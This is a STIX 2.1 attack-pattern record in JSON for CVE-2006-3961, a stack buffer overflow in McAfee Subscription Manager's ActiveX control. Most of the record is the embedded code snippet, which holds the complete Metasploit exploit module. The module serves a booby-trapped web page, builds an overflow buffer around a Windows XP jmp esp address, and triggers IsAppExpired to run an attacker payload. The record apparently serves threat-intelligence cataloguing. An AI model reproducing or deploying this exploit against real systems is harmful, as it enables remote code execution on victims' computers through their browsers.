{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4add6b4c-5d1b-4424-a5c4-92d8efd55c77",
    "created": "2024-08-14T16:44:41.195911Z",
    "modified": "2024-08-14T16:44:41.195915Z",
    "name": "McAfee Subscription Manager Stack Buffer Overflow",
    "description": " This module exploits a flaw in the McAfee Subscription Manager ActiveX control. Due to an unsafe use of vsprintf, it is possible to trigger a stack buffer overflow by passing a large string to one of the COM-exposed routines, such as IsAppExpired. This vulnerability was discovered by Karl Lynn of eEye.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/mcafee_mcsubmgr_vsprintf.rb",
            "external_id": "mcafee_mcsubmgr_vsprintf.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-3961"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'McAfee Subscription Manager Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a flaw in the McAfee Subscription Manager ActiveX control.\n        Due to an unsafe use of vsprintf, it is possible to trigger a stack buffer overflow by\n        passing a large string to one of the COM-exposed routines, such as IsAppExpired.\n        This vulnerability was discovered by Karl Lynn of eEye.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'skape',\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2006-3961'],\n          [ 'OSVDB', '27698'],\n          [ 'BID', '19265']\n        ],\n      'Payload'        =>\n        {\n          'Space'          => 1014,\n          'MaxNops'        => 0,\n          'BadChars'       => \"\\x00\\x09\\x0a\\x0d'\\\\\" + Rex::Text::UpperAlpha + Rex::Text::HighAscii,\n          'EncoderType'    => Msf::Encoder::Type::NonUpperUtf8Safe,\n          'EncoderOptions' =>\n            {\n              'BufferOffset' => 0x8\n            }\n        },\n      'Platform'       => %{ win },\n      'Targets'        =>\n        [\n          # Target 0: Automatic\n          [\n            'Windows XP SP0/SP1',\n            {\n              'Platform' => 'win',\n              'Rets'     =>\n                [\n                  0x7605122f, # XP SP0/SP1 shell32.dll: jmp esp\n                  #0x773f346a  # XP SP2 comctl32.dll: jmp esp\n                ]\n            },\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2006-08-01'))\n  end\n\n  def on_request_uri(cli, request)\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Pick the right target\n    case request['User-Agent']\n      when /Windows NT 5.1/\n        ret = target['Rets'][0]\n      else\n        print_error(\"Unsupported target: #{request['User-Agent']}\")\n        cli.send_response(create_response(404, 'File not found'))\n        return\n    end\n\n    # Build out our overflow buffer\n    buf =\n      rand_text(2972, payload_badchars) +\n      [ ret ].pack('V') +\n      \"\\x60\" + # pusha\n      \"\\x6a\" + rand_char + # push byte 0x1\n      \"\\x6a\" + rand_char + # push byte 0x1\n      \"\\x6a\" + rand_char + # push byte 0x1\n      \"\\x61\" + # popa\n      p.encoded\n\n    # Generate random variable names\n    vname    = rand_text_alpha(rand(100) + 1)\n    strname  = rand_text_alpha(rand(100) + 1)\n\n    # Build out the message\n    content =\n      \"<html>\" +\n      \"<object classid='clsid:9BE8D7B2-329C-442A-A4AC-ABA9D7572602' id='#{vname}'></object>\" +\n      \"<script language='javascript'>\\n\" +\n      \"var #{vname} = document.getElementById('#{vname}');\\n\" +\n      \"var #{strname} = new String('#{buf}');\\n\" +\n      \"#{vname}.IsAppExpired(#{strname}, #{strname}, #{strname});\\n\" +\n      \"</script>\" +\n      \"</html>\"\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-08-01",
    "x_mitre_platforms": [
        "win'"
    ]
}